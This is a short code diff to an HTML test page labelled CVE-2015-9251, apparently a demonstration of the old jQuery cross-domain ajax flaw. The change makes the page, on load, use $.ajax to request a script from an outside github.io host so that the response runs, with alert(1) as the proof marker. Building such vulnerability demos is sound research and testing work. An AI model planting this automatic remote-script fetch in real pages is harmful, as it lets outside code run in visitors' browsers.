@@ -8,17 +8,17 @@
     <p>CVE-2015-9251</p>
 
     <script>
-        let check = document.getElementById('check');
+        const img = new Image();
 
-        check.addEventListener('click', () => {
-            const img = new Image();
-
-            img.addEventListener('error', () => {
-                alert(1);
+        img.addEventListener('error', () => {
+            $.ajax({
+                url: 'http://keatshos.github.io/Scripts/Application.js',
+                success: function () {
+                    alert(1);
+                }
             });
-
-            img.src = 'https://keatshos.github.io/does-not-exist.png';
         });
+        img.src = 'https://keatshos.github.io/does-not-exist.png';
     </script>
 </body>
 </html>
